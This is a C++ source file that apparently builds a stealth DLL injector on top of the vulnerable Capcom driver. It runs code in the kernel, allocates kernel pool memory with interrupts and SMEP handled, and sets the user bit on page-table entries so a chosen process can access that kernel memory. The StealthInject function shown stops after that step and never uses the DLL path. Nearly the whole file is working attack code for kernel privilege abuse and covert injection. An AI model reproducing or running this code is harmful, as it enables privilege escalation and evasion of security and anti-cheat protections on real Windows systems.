#include <windows.h>
#include <string>
#include <stdio.h>
#include "MemoryController.h"
#include "../CapcomDriverAttack/CapcomWrapper.h"

using namespace std;

struct ALLOCATE_DATA {
    SIZE_T size;
    PVOID memPtr = NULL;
};

void __stdcall AllocateKernelMemory(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {
    ALLOCATE_DATA* pData = (ALLOCATE_DATA*)userData;
    pData->memPtr = (ALLOCATE_DATA*)CallWithInterruptsAndSmep(
        ExAllocatePool,
        0ull, 
        pData->size
    );
}

PVOID AllocateKernelMemory(SIZE_T size) {
    ALLOCATE_DATA data;
    data.size = size;
    RunInKernel(AllocateKernelMemory, &data);
    return data.memPtr;
}

BOOL ExposeKernelMemoryToProcess(PVOID memory, SIZE_T size, uint64_t eProcess) {

    SetTargetEProcess(eProcess);
    BOOL success = TRUE;

    IterPhysRegion(memory, size, [&](PVOID va, uint64_t pa, SIZE_T sz) {
		auto info = QueryPageTableInfo(va);

		info.Pml4e->user = TRUE;
		info.Pdpte->user = TRUE;
		info.Pde->user = TRUE;

		if (!info.Pde || (info.Pte && (!info.Pte->present))) {
			success = FALSE;
		}
		else {
			if (info.Pte) {
                info.Pte->user = TRUE;
            }
		}
	});

    UnsetEProcess();
    
    return success;
}


BOOL StealthInject(string processName, string dllPath) {

    if (!InitMemoryController()) {
        return FALSE;
    }

    PVOID kernelMemory = AllocateKernelMemory(1000);
    if (kernelMemory == NULL) {
        return FALSE;
    }
    // printf("memBegin: %16llx\n", (uint64_t)kernelMemory);

    if (!ExposeKernelMemoryToProcess(kernelMemory, 1000, currentEProcess)) {
        return FALSE;
    }


    return TRUE;
}

